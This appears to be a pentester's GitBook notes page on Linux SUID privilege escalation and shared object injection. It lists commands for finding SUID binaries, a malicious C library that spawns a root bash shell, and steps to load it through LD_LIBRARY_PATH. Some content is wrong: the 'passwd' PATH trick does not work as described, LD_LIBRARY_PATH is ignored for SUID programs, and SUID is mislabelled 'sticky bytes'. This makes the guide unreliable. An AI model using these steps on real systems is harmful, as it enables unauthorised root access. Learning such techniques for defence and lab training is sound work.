# 🛸 SUID

## SUID Privilege Escalation

SUID (Set User ID) is a special permission in Unix-like operating systems that allows users to execute a program with the permissions of its owner. When a binary has the SUID bit set, it runs with the privileges of the binary's owner, often allowing users to perform actions they wouldn't normally be able to do.

<figure><img src="https://miro.medium.com/v2/resize:fit:462/1*1r70GrNPiSPWmQnh7N-LSA.png" alt=""><figcaption></figcaption></figure>

### Understanding SUID

The SUID permission is represented by the numeric value 4 in the permission field of a file. When an executable file has the SUID bit set, it runs with the effective user ID (EUID) of the file's owner.

```bash
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 54208 Nov  3  2022 /usr/bin/passwd
```

In the example above, `/usr/bin/passwd` has the SUID bit set. The 's' in the owner's execute permission (`-rwsr-xr-x`) indicates the SUID bit.

### Exploiting SUID for Privilege Escalation

#### 1. Identifying SUID Binaries

```bash
$ find / -type f -perm -4000 2>/dev/null
```

This command lists all files on the system with the SUID bit set. Pay attention to binaries owned by root, as they may provide an opportunity for privilege escalation.

#### 2. Checking Vulnerabilities

Some SUID binaries may have vulnerabilities or misconfigurations that can be exploited. Commonly misconfigured binaries include editors, interpreters, and custom scripts.

```bash
$ strings /path/to/suid_binary
$ ltrace /path/to/suid_binary
$ strace /path/to/suid_binary
```

These commands help analyze the behavior of the binary, providing insights into its functionality and potential vulnerabilities.

Once you found all the files that have the sticky bytes, compare it to the gtfobins database to see which one are vulnerable to known exploits:&#x20;

<figure><img src="../../../../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

#### 3. Exploiting Vulnerabilities

**Example: Exploiting `passwd`**

```bash
$ echo 'root::0:0:root:/root:/bin/bash' > /tmp/passwd
$ PATH=/tmp /usr/bin/passwd
```

In this example, a writable `/tmp/passwd` file is created, and the `PATH` environment variable is manipulated to make `/usr/bin/passwd` use the local directory for executable files. This allows an attacker to change the root user's password without knowing the current password.

#### 4. Using Scripts and Tools

Several tools and scripts automate the process of identifying and exploiting SUID binaries. Examples include [GTFOBins](https://gtfobins.github.io/) and [LinEnum](https://github.com/rebootuser/LinEnum).

### Shared Object Injection <a href="#lecture_heading" id="lecture_heading"></a>

Shared Object Injection is a technique where an attacker exploits the dynamic linking functionality in Unix-based systems to load and execute malicious shared objects (shared libraries). By manipulating the loading process of shared objects, an attacker can achieve privilege escalation and execute arbitrary code with elevated permissions.

#### Understanding Shared Objects

Shared objects, also known as shared libraries, are files containing compiled code and data that multiple programs can use simultaneously. These libraries are loaded at runtime and linked dynamically to the executing process.

#### Identifying Shared Objects

Shared objects typically have file extensions like `.so` on Linux systems. They can be found in directories such as `/lib`, `/lib64`, `/usr/lib`, and others.

```bash
$ find /lib /lib64 /usr/lib -name "*.so*"
```

#### Exploiting Shared Object Injection

#### 1. Identifying Vulnerable Programs

Look for programs that load shared objects without specifying the full path. These programs are susceptible to shared object injection.

```bash
$ ldd /path/to/binary
```

#### 2. Creating a Malicious Shared Object

Write a shared object with malicious code. For example, create a file named `malicious.so` with the following:

<pre class="language-c"><code class="lang-c">// malicious.c
#include &#x3C;stdio.h>
#include &#x3C;stdlib.h>

__attribute__((constructor)) void init() {
    system("/bin/bash");
<strong>}
</strong></code></pre>

Compile it:

```bash
$ gcc -fPIC -shared -o malicious.so malicious.c
```

#### 3. Exploiting the Vulnerability

Place the malicious shared object in a directory that is part of the target binary's library search path.

```bash
$ export LD_LIBRARY_PATH=/path/to/directory/containing/malicious.so
$ /path/to/vulnerable/binary
```

#### Real world test:

we know which file to attack in this example:

<figure><img src="../../../../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

We are curious to know what this file does:

```
strace /usr/local/bin/suid-so
```

<figure><img src="../../../../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

What we hunt for are those "No such file or directory" error messages and write down what file it's trying to access. We can grep on this:

```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

<figure><img src="../../../../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

Our goal is to overwrite a file that is being called but does not exist, such as libcalc.so and inject malicious code in those files
